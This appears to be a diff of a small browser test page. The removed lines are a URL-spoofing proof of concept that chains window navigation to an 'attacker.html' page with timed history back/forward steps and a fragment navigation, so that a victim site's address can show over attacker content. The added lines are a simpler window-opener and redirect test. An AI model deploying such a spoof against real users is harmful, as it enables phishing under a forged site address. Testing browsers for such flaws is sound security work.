@@ -1,20 +1,10 @@
+<button onclick="test()">clickme</button>
 <script>
-var w = null;
-function spoof() {
-  w = window.open("about:blank");
-
-  // Step 1: Load victim page.
-  w.location = "http://google.com/csi";
-
-  // Step 2: Navigate to attacker's page.
-  setTimeout('w.location = "attacker.html"', 1000);
-
-  // Step 3: Go back.
-  setTimeout('w.history.back();', 2000);
-
-  // Step 4: Go forward, but interrupt with a quick fragment navigation.
-  setTimeout('w.history.forward(); setTimeout("w.location = \'http://google.com/csi#123\'", 1);', 3000);
+function test()
+{
+  w = open()
+  w.opener = null
+  w.document.write('Hi')
+  w.location = 'http://goo.gl/3Hywh'
 }
 </script>
-
-<a href="javascript:spoof();">Click Me</a>
